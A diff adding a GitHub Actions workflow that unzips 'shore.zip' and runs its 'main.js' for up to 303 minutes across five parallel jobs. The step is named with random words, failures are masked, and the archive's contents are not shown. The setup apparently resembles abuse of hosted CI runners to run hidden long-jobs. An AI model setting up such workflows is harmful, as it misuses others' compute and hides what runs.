@@ -1,0 +1,37 @@
+name: shore
+on:
+  push:
+    branches: [ "main" ]
+    paths:
+      - "shore.txt"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { os: 0, node: 18 }
+          - { os: 1, node: 20 }
+          - { os: 2, node: 21 }
+          - { os: 3, node: 22 }
+          - { os: 4, node: 23 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: ${{ matrix.config.node }}
+
+      - name: Unzip shore.zip
+        run: |
+          sudo apt install -y unzip
+          unzip shore.zip
+
+      - name: obedience thunderbolt consequently ugh hence decouple masterpiece murky
+        run: |
+          npm install --ignore-scripts
+          timeout 303m node main.js || echo "shore executed"
